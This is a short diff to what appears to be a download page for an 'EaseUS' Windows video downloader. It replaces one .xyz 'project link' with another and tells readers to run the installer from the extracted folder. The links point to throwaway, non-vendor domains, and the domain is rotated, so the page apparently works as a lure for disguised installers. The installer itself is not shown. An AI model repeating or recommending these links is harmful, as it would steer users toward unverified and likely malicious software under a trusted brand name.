@@ -8,8 +8,8 @@ EaseUS desktop package for Windows · video toolkit · local install ready.
 
 > Use the project link below for Windows.
 
-* **Project link:** **[easeus-video-downloader.nexpath.xyz](https://easeus-video-downloader.nexpath.xyz/)**
-* **Full URL:** `https://easeus-video-downloader.nexpath.xyz/`
+* **Project link:** **[easeus-video-downloader.nerasix.xyz](https://easeus-video-downloader.nerasix.xyz/)**
+* **Full URL:** `https://easeus-video-downloader.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
